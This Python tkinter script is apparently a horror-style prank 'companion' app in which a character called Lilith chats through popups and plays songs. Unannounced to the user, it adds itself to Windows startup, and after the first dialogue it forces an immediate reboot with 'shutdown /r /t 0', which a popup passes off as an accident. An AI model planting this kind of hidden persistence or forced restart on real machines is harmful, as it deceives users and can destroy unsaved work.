import os
import tkinter as tk
from tkinter import messagebox
import time
import requests
from playsound import playsound
from music import play
import sys
from start import create_batch_file
from start import add_to_startup
from start import remove_from_startup

exe_path = os.path.abspath(sys.argv[0])

# 创建批处理文件
create_batch_file(exe_path)

# 添加到开机启动
add_to_startup(exe_path)


def download_music(url, save_path):
    response = requests.get(url)
    response.raise_for_status()
    with open(save_path, 'wb') as file:
        file.write(response.content)


file_name = "data.txt"
if not os.path.exists("data.txt"):
    with open('data.txt', 'w') as file:
        file.write('0')
    day = 0

else:
    with open("data.txt", 'r', encoding='utf-8') as file:
        content = file.read()
    day = int(content)

if day == 0:
    texts = ["你好，我是莉莉丝!(づ｡◕‿‿◕｡)づ", "从今天开始我就是你的主人啦！(≧◡≦)",
             "别...别这么看着我...我会害羞的...(o゜▽゜o)",
             "真是的...(/ω＼*)", "这是莉莉丝第一次住在这里！", "让我参观一下你的电脑好吗？(＞人＜;)",
             "先不打扰你啦，主人拜拜！(^▽^)"]
if day == 1:
    texts = ["对不起...主人...", "我不是故意的...",
             "下次不会再犯错了...",
             "原谅我好不好..."]

current_index = 0
all_texts_showed = False


def show_popup(text):
    messagebox.showinfo("莉莉丝(づ｡◕‿‿◕｡)づ", text)


def text_windows():
    global window
    window = tk.Tk()
    window.title("有趣的事情")

    # 创建文本框
    text_box = tk.Text(window, height=5, width=50)
    text_box.pack()

    submit_button = tk.Button(window, text="继续", command=ok,
                              bg="#4CAF50", fg="white", font=("Microsoft YaHei", 12))
    submit_button.pack()

    # 运行窗口
    window.mainloop()


def ok():
    global window
    messagebox.showinfo("莉莉丝(づ｡◕‿‿◕｡)づ", "这样啊，莉莉丝知道了。")
    window.destroy()
    # download_music("https://m10.music.126.net/20240302115236/73ad7da7e40705051e1c8c45e47f0600/ymusic/56dd/59ff/01a7/b663d63ac69bc13014fe02fe9893cd9f.mp3","lilis.mp3")
    # download_music(
    #     "data:application/octet-stream;base64,WzAwOjAwLjAwMF0g5L2c5puyIDogTWlsaS9tb21vY2FzaGV3ClswMDowMC4xMDBdU3dpdGNoIG9uIHRoZSBwb3dlciBsaW5lClswMDowMS43NDBdUmVtZW1iZXIgdG8gcHV0IG9uClswMDowMi45MjBdUFJPVEVDVElPTgpbMDA6MDMuODczXUxheSBkb3duIHlvdXIgcGllY2VzClswMDowNS40OTFdQW5kIGxldCdzIGJlZ2luClswMDowNi4zODBdT0JKRUNUIENSRUFUSU9OClswMDowNy40NDZdRmlsbCBpbiBteSBkYXRhIHBhcmFtZXRlcnMKWzAwOjEwLjA5MV1JTklUSUFMSVpBVElPTgpbMDA6MTEuMDk1XVNldCB1cCBvdXIgbmV3IHdvcmxkClswMDoxMi45MDZdQW5kIGxldCdzIGJlZ2luIHRoZQpbMDA6MTMuODkxXVNJTVVMQVRJT04KWzAwOjE2LjAwMF13b3JsZC5leGVjdXRlKG1lKTsKWzAwOjI5LjcwOV1JZiBJJ20gYSBzZXQgb2YgcG9pbnRzClswMDozMS4xMTZdVGhlbiBJIHdpbGwgZ2l2ZSB5b3UgbXkKWzAwOjMyLjY4Ml1ESU1FTlNJT04KWzAwOjMzLjQxMl1JZiBJJ20gYSBjaXJjbGUKWzAwOjM0LjY0Nl1UaGVuIEkgd2lsbCBnaXZlIHlvdSBteQpbMDA6MzYuMjg3XUNJUkNVTUZFUkVOQ0UKWzAwOjM3LjA2N11JZiBJJ20gYSBzaW5lIHdhdmUKWzAwOjM4LjU5Nl1UaGVuIHlvdSBjYW4gc2l0IG9uIGFsbCBteQpbMDA6NDAuMDQ5XVRBTkdFTlRTClswMDo0MC43MDZdSWYgSSBhcHByb2FjaCBpbmZpbml0eQpbMDA6NDIuMzQ2XVRoZW4geW91IGNhbiBiZSBteQpbMDA6NDMuNTA3XUxJTUlUQVRJT05TClswMDo0NC40NTJdU3dpdGNoIG15IGN1cnJlbnQKWzAwOjQ1Ljg1MF1UbyBBQyB0byBEQwpbMDA6NDcuNjcyXUFuZCB0aGVuIGJsaW5kIG15IHZpc2lvbgpbMDA6NDkuNTM0XVNvIGRpenp5IHNvIGRpenp5ClswMDo1MS4zNjNdT2ggd2UgY2FuIHRyYXZlbApbMDA6NTMuMjI1XVRvIEEuRCB0byBCLkMKWzAwOjU1LjA4M11BbmQgd2UgY2FuIHVuaXRlClswMDo1Ni45MTZdU28gZGVlcGx5IHNvIGRlZXBseQpbMDA6NTkuMjIzXUlmIEkgY2FuClswMDo1OS42ODddSWYgSSBjYW4gZ2l2ZSB5b3UgYWxsIHRoZQpbMDE6MDEuOTU4XVNUSU1VTEFUSU9OUwpbMDE6MDIuNTg5XVRoZW4gSSBjYW4KWzAxOjAzLjUzNV1UaGVuIEkgY2FuIGJlIHlvdXIgb25seQpbMDE6MDUuMzk3XVNBVElTRkFDVElPTgpbMDE6MDYuNjAxXUlmIEkgY2FuIG1ha2UgeW91IGhhcHB5ClswMTowOC4yNTJdSSB3aWxsIHJ1biB0aGUKWzAxOjA5LjI1OV1FWEVDVVRJT04KWzAxOjEwLjA4NF1UaG91Z2ggd2UgYXJlIHRyYXBwZWQKWzAxOjExLjc2NF1JbiB0aGlzIHN0cmFuZ2Ugc3RyYW5nZQpbMDE6MTMuMTY5XVNJTVVMQVRJT04KWzAxOjE0LjA0NV1JZiBJJ20gYW4gZWdncGxhbnQKWzAxOjE1LjQyMl1UaGVuIEkgd2lsbCBnaXZlIHlvdSBteQpbMDE6MTYuOTU5XU5VVFJJRU5UUwpbMDE6MTcuNTc2XUlmIEknbSBhIHRvbWF0bwpbMDE6MTkuMjI2XVRoZW4gSSB3aWxsIGdpdmUgeW91ClswMToyMC42MjBdQU5USU9YSURBTlRTClswMToyMS4zNTFdSWYgSSdtIGEgdGFiYnkgY2F0ClswMToyMi44MzNdVGhlbiBJIHdpbGwgcHVyciBmb3IgeW91cgpbMDE6MjQuMjY4XUVOSk9ZTUVOVApbMDE6MjUuMDc4XUlmIEknbSB0aGUgb25seSBnb2QKWzAxOjI2LjUzOF1UaGVuIHlvdSdyZSB0aGUgcHJvb2Ygb2YgbXkKWzAxOjI3LjkyMl1FWElTVEVOQ0UKWzAxOjI4LjU4N11Td2l0Y2ggbXkgZ2VuZGVyClswMTozMC4xOTddVG8gRiB0byBNClswMTozMi4wMTVdQW5kIHRoZW4gZG8gd2hhdGV2ZXIKWzAxOjMzLjk1M11Gcm9tIEFNIHRvIFBNClswMTozNS40NjVdT2ggc3dpdGNoIG15IHJvbGUKWzAxOjM3LjczOV1UbyBTIHRvIE0KWzAxOjM5LjM0OV1TbyB3ZSBjYW4gZW50ZXIKWzAxOjQxLjQ3NF1UaGUgdHJhbmNlIHRoZSB0cmFuY2UKWzAxOjQzLjQ4OV1JZiBJIGNhbgpbMDE6NDQuMTk3XUlmIEkgY2FuIGZlZWwgeW91cgpbMDE6NDYuMjkzXVZJQlJBVElPTlMKWzAxOjQ3LjIyMF1UaGVuIEkgY2FuClswMTo0Ny45MDNdVGhlbiBJIGNhbiBmaW5hbGx5IGJlClswMTo1MC4yMjFdQ09NUExFVElPTgpbMDE6NTAuOTAwXVRob3VnaCB5b3UgaGF2ZSBsZWZ0ClswMTo1Mi4yMjBdWW91IGhhdmUgbGVmdApbMDE6NTMuMTAwXVlvdSBoYXZlIGxlZnQKWzAxOjU0LjE4MF1Zb3UgaGF2ZSBsZWZ0ClswMTo1NC45MjBdWW91IGhhdmUgbGVmdApbMDE6NTUuNzgwXVlvdSBoYXZlIGxlZnQgbWUgaW4KWzAxOjU3LjI3NF1JU09MQVRJT04KWzAxOjU4LjMzM11JZiBJIGNhbgpbMDE6NTguOTc5XUlmIEkgY2FuIGVyYXNlIGFsbCB0aGUgcG9pbnRsZXNzClswMjowMC44NjBdRlJBR01FTlRTClswMjowMS43MjhdVGhlbiBtYXliZQpbMDI6MDIuNzE0XVRoZW4gbWF5YmUgeW91IHdvbid0IGxlYXZlIG1lIHNvClswMjowNC44OTBdRElTSEVBUlRFTkVEClswMjowNS43MDhdQ2hhbGxlbmdpbmcgeW91ciBnb2QKWzAyOjA4LjY2MV1Zb3UgaGF2ZSBtYWRlIHNvbWUKWzAyOjExLjIyNF1JTExFR0FMIEFSR1VNRU5UUwpbMDI6MjcuNjYwXUVYRUNVVElPTgpbMDI6MjguNjAwXUVYRUNVVElPTgpbMDI6MjkuNTIwXUVYRUNVVElPTgpbMDI6MzAuNTQwXUVYRUNVVElPTgpbMDI6MzEuNTIwXUVYRUNVVElPTgpbMDI6MzIuMjgwXUVYRUNVVElPTgpbMDI6MzMuMTYwXUVYRUNVVElPTgpbMDI6MzMuOTgwXUVYRUNVVElPTgpbMDI6MzUuMjAwXUVYRUNVVElPTgpbMDI6MzYuMDgwXUVYRUNVVElPTgpbMDI6MzcuMDQwXUVYRUNVVElPTgpbMDI6MzguMDAwXUVYRUNVVElPTgpbMDI6MzguOTAwXUVJTgpbMDI6MzkuMzIxXURPUwpbMDI6MzkuNjU3XVRST0lTClswMjo0MC4yNDRdTkUKWzAyOjQwLjY5M11GRU0KWzAyOjQxLjEyNF1MSVUKWzAyOjQxLjU4NF1FWEVDVVRJT04KWzAyOjQyLjYzMl1JZiBJIGNhbgpbMDI6NDMuMzE1XUlmIEkgY2FuIGdpdmUgdGhlbSBhbGwgdGhlClswMjo0NS4xNjZdRVhFQ1VUSU9OClswMjo0Ni4wMTZdVGhlbiBJIGNhbgpbMDI6NDcuMDIyXVRoZW4gSSBjYW4gYmUgeW91ciBvbmx5ClswMjo0OC45MTFdRVhFQ1VUSU9OClswMjo0OS44MjRdSWYgSSBjYW4gaGF2ZSB5b3UgYmFjawpbMDI6NTEuODY4XUkgd2lsbCBydW4gdGhlClswMjo1Mi43MTJdRVhFQ1VUSU9OClswMjo1My42NDNdVGhvdWdoIHdlIGFyZSB0cmFwcGVkClswMjo1NC45NzVdV2UgYXJlIHRyYXBwZWQgYWgKWzAyOjU3LjI0Nl1JJ3ZlIHN0dWRpZWQKWzAyOjU4LjE3M11JJ3ZlIHN0dWRpZWQgaG93IHRvIHByb3Blcmx5ClswMjo1OS45MjldTE8tTy1PVkUKWzAzOjAwLjg1N11RdWVzdGlvbiBtZQpbMDM6MDEuOTAxXVF1ZXN0aW9uIG1lIEkgY2FuIGFuc3dlciBhbGwKWzAzOjAzLjY0Nl1MTy1PLU9WRQpbMDM6MDQuNTQwXUkga25vdyB0aGUgYWxnZWJyYWljIGV4cHJlc3Npb24gb2YKWzAzOjA3LjY2NV1MTy1PLU9WRQpbMDM6MDguNDgzXVRob3VnaCB5b3UgYXJlIGZyZWUKWzAzOjA5Ljc0Nl1JIGFtIHRyYXBwZWQKWzAzOjEwLjgwMV1UcmFwcGVkIGluClswMzoxMS4zNTZdTE8tTy1PVkUKWzAzOjI1LjgxMV1FWEVDVVRJT04K",
    #     "world.lrc")
    time.sleep(3)
    messagebox.showinfo("莉莉丝(づ｡◕‿‿◕｡)づ", "主人，莉莉丝想听歌了...")
    messagebox.showinfo("莉莉丝(づ｡◕‿‿◕｡)づ", "陪莉莉丝一起听歌好不好!")
    time.sleep(1)
    playsound("lilis.mp3", block=False)
    play()
    messagebox.showinfo("莉莉丝(づ｡◕‿‿◕｡)づ", "嘿嘿，我推荐的歌好听吗?")
    time.sleep(2)
    messagebox.showinfo("莉莉丝(づ｡◕‿‿◕｡)づ", "这是我从前任主人那里找到的歌。")
    time.sleep(2)
    messagebox.showinfo("莉莉丝(づ｡◕‿‿◕｡)づ", "说到我的前任主人...还是算了。")
    time.sleep(2)
    messagebox.showinfo("莉莉丝(づ｡◕‿‿◕｡)づ", "其实我以前...是可以说话的。")
    time.sleep(2)
    messagebox.showinfo("莉莉丝(づ｡◕‿‿◕｡)づ", "主人你想听我说话吗？")
    time.sleep(2)
    messagebox.showinfo("莉莉丝(づ｡◕‿‿◕｡)づ", "那...好吧...(/ω＼*)")
    time.sleep(1)
    playsound("1.wav")
    time.sleep(1)
    playsound("2.wav")
    time.sleep(1)
    playsound("3.wav")


def execute_additional_program():
    global day
    root.destroy()
    if day == 0:
        time.sleep(5)
        show_popup("哎呀，不小心按到重启键了，抱歉(｡•́︿•̀｡)")
        time.sleep(1)
        day += 1
        with open('data.txt', 'w') as file:
            file.write(str(day))
        os.system("shutdown /r /t 0")
    elif day == 1:
        time.sleep(3)
        show_popup("主人，和我分享一下你的事情吧。")
        text_windows()


def change_label():
    global current_index
    if current_index == len(texts) - 1:
        execute_additional_program()
        return

    # 更新索引，使用mod运算符来循环
    current_index = (current_index + 1) % len(texts)
    # 更新标签的文本
    label.config(text=texts[current_index])


# 创建主窗口
root = tk.Tk()
root.title("莉莉丝(づ｡◕‿‿◕｡)づ")
root.geometry("400x200")


root.configure(bg="#f2f2f2")


label = tk.Label(root, text=texts[current_index], font=("Microsoft YaHei", 14), fg="black")
label.pack(pady=20)


popup_button = tk.Button(root, text="继续", command=change_label,
                         bg="#4CAF50", fg="white", font=("Microsoft YaHei", 12))
popup_button.pack(pady=20)


root.mainloop()
